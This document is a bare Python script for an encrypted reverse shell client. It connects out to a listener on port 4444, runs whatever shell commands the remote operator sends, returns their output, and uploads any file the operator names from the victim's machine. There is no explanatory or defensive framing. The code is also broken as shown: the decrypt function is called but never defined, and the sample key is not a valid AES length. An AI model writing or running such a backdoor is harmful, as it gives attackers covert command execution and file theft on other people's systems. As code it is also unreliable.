#!/usr/bin/env python3
import socket, subprocess, hashlib, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'Your32ByteSecretKey1234567890abc!'  # Must match listener!
SERVER_IP, SERVER_PORT = "127.0.0.1", 4444

def encrypt(data):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

def connect():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, SERVER_PORT))
    print(f"[*] Connected to {SERVER_IP}:{SERVER_PORT}")

    try:
        while True:
            data = decrypt(client.recv(4096))
            if not data: break
            
            # File upload (client -> server)
            if data.startswith(b"upload "):
                file_path = data.split()[1].decode()
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        client.send(encrypt(f.read()))
                else:
                    client.send(encrypt(b"File not found"))
            
            # Command execution
            else:
                if data.lower() == b"exit": break
                output = subprocess.getoutput(data.decode())
                client.send(encrypt(output.encode()))
                
    finally:
        client.close()

if __name__ == "__main__":
    connect()
